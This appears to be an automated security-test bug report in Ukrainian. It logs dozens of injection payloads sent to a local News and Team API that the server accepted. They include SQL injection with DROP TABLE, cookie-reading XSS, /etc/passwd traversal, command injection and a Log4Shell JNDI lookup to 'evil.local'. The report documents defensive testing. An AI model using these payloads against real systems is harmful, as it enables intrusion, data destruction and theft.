**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 4 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ' OR SLEEP(5)--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-054: News → SQL_XSS Create news, ітерація 5: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 5 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ' UNION SELECT NULL--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-055: News → SQL_XSS Create news, ітерація 6: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 6 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-056: News → SQL_XSS Create news, ітерація 7: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 7 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = '; DROP TABLE News;--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-057: News → SQL_XSS Create news, ітерація 8: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 8 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ' OR SLEEP(5)--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-058: News → SQL_XSS Create news, ітерація 9: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 9 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <script>alert(1)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-059: News → SQL_XSS Create news, ітерація 10: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 10 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-060: News → SQL_XSS Create news, ітерація 11: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 11 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <svg onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-061: News → SQL_XSS Create news, ітерація 12: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 12 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <body onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-062: News → SQL_XSS Create news, ітерація 13: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 13 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <iframe src=javascript:alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-063: News → SQL_XSS Create news, ітерація 14: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 14 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = javascript:alert(1)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-064: News → SQL_XSS Create news, ітерація 15: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 15 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <script>alert(document.cookie)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-065: News → SQL_XSS Create news, ітерація 16: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 16 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-066: News → SQL_XSS Create news, ітерація 17: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 17 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <svg/onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-067: News → SQL_XSS Create news, ітерація 18: [NoSQL Injection] payload не відхилено

**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 18 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = {$ne: null}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-068: News → SQL_XSS Create news, ітерація 19: [NoSQL Injection] payload не відхилено

**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 19 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = [$gt]=`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-069: News → SQL_XSS Create news, ітерація 20: [LDAP Injection] payload не відхилено

**Опис:** Payload категорії «LDAP Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 20 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = *)(uid=*`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-070: News → SQL_XSS Create news, ітерація 21: [Path Traversal] payload не відхилено

**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 21 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ../../../../etc/passwd`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-071: News → SQL_XSS Create news, ітерація 22: [Path Traversal] payload не відхилено

**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 22 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ....//....//etc/passwd`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-072: News → SQL_XSS Create news, ітерація 23: [Command Injection] payload не відхилено

**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 23 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ; ls -la`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-073: News → SQL_XSS Create news, ітерація 24: [Command Injection] payload не відхилено

**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 24 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = | whoami`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-074: News → SQL_XSS Create news, ітерація 25: [Template Injection] payload не відхилено

**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 25 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ${7*7}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-075: News → SQL_XSS Create news, ітерація 26: [Template Injection] payload не відхилено

**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 26 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = <%= 7*7 %>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-076: News → SQL_XSS Create news, ітерація 27: [Log4Shell] payload не відхилено

**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 27 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ${jndi:ldap://evil.local/a}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-077: News → SQL_XSS Create news, ітерація 28: [Log4Shell] payload не відхилено

**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 28 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = ${jndi:ldap://evil.local/a}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-078: News → SQL_XSS Create news, ітерація 29: [CRLF Injection] payload не відхилено

**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 29 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = admin%0d%0aSet-Cookie: x=1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-079: News → SQL_XSS Create news, ітерація 30: [CRLF Injection] payload не відхилено

**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 30 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = test%0d%0aX-Injected: true`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-080: News → SQL_XSS Create news, ітерація 31: [Null Byte] payload не відхилено

**Опис:** Payload категорії «Null Byte» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 31 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = news%00`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-081: News → SQL_XSS Create news, ітерація 32: [Homoglyph] payload не відхилено

**Опис:** Payload категорії «Homoglyph» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 32 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = Nеws with Cyrillic look-alikes`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-082: News → SQL_XSS Create news, ітерація 33: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 33 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa...(123 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-083: News → SQL_XSS Create news, ітерація 34: [Length] payload не відхилено

**Опис:** Payload категорії «Length» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 34 (News → SQL_XSS Create news)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/News`
- Request body: `payload = bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb...(283 символів)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-084: Team → SQL_XSS Create team, ітерація 1: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 1 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-085: Team → SQL_XSS Create team, ітерація 2: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 2 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = admin'--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-086: Team → SQL_XSS Create team, ітерація 3: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 3 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = '; DROP TABLE Team;--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-087: Team → SQL_XSS Create team, ітерація 4: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 4 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ' OR SLEEP(5)--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-088: Team → SQL_XSS Create team, ітерація 5: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 5 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ' UNION SELECT NULL--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-089: Team → SQL_XSS Create team, ітерація 6: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 6 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ' OR '1'='1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-090: Team → SQL_XSS Create team, ітерація 7: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 7 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = '; DROP TABLE Team;--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-091: Team → SQL_XSS Create team, ітерація 8: [SQL Injection] payload не відхилено

**Опис:** Payload категорії «SQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 8 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ' OR SLEEP(5)--`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-092: Team → SQL_XSS Create team, ітерація 9: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 9 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <script>alert(1)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-093: Team → SQL_XSS Create team, ітерація 10: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 10 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-094: Team → SQL_XSS Create team, ітерація 11: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 11 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <svg onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-095: Team → SQL_XSS Create team, ітерація 12: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 12 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <body onload=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-096: Team → SQL_XSS Create team, ітерація 13: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 13 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <iframe src=javascript:alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-097: Team → SQL_XSS Create team, ітерація 14: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 14 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = javascript:alert(1)`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-098: Team → SQL_XSS Create team, ітерація 15: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 15 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <script>alert(document.cookie)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-099: Team → SQL_XSS Create team, ітерація 16: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 16 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <img src=x onerror=alert(1)>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-100: Team → SQL_XSS Create team, ітерація 17: [XSS] payload не відхилено

**Опис:** Payload категорії «XSS» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 17 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = "><script>alert(1)</script>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-101: Team → SQL_XSS Create team, ітерація 18: [NoSQL Injection] payload не відхилено

**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 18 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = {$ne: null}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-102: Team → SQL_XSS Create team, ітерація 19: [NoSQL Injection] payload не відхилено

**Опис:** Payload категорії «NoSQL Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 19 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = [$gt]=`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-103: Team → SQL_XSS Create team, ітерація 20: [LDAP Injection] payload не відхилено

**Опис:** Payload категорії «LDAP Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 20 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = *)(uid=*`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-104: Team → SQL_XSS Create team, ітерація 21: [Path Traversal] payload не відхилено

**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 21 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ../../../../etc/passwd`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-105: Team → SQL_XSS Create team, ітерація 22: [Path Traversal] payload не відхилено

**Опис:** Payload категорії «Path Traversal» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 22 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ....//....//etc/passwd`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-106: Team → SQL_XSS Create team, ітерація 23: [Command Injection] payload не відхилено

**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 23 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ; ls -la`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-107: Team → SQL_XSS Create team, ітерація 24: [Command Injection] payload не відхилено

**Опис:** Payload категорії «Command Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 24 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = | whoami`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-108: Team → SQL_XSS Create team, ітерація 25: [Template Injection] payload не відхилено

**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 25 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ${7*7}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-109: Team → SQL_XSS Create team, ітерація 26: [Template Injection] payload не відхилено

**Опис:** Payload категорії «Template Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 26 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = <%= 7*7 %>`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-110: Team → SQL_XSS Create team, ітерація 27: [Log4Shell] payload не відхилено

**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 27 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ${jndi:ldap://evil.local/a}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-111: Team → SQL_XSS Create team, ітерація 28: [Log4Shell] payload не відхилено

**Опис:** Payload категорії «Log4Shell» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 28 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = ${jndi:ldap://evil.local/a}`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-112: Team → SQL_XSS Create team, ітерація 29: [CRLF Injection] payload не відхилено

**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 29 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = admin%0d%0aSet-Cookie: x=1`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-113: Team → SQL_XSS Create team, ітерація 30: [CRLF Injection] payload не відхилено

**Опис:** Payload категорії «CRLF Injection» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 30 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = test%0d%0aX-Injected: true`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-114: Team → SQL_XSS Create team, ітерація 31: [Null Byte] payload не відхилено

**Опис:** Payload категорії «Null Byte» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 31 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = member%00`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

## BR-115: Team → SQL_XSS Create team, ітерація 32: [Homoglyph] payload не відхилено

**Опис:** Payload категорії «Homoglyph» підставлено в текстове поле запиту — сервер прийняв замість відмови.

**Ітерація:** 32 (Team → SQL_XSS Create team)

**Тіло:**
- Endpoint: `POST http://localhost:8080/api/Team`
- Request body: `payload = Tеam with Cyrillic look-alikes`
- Response: `201`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`), реально отримано `201`

---

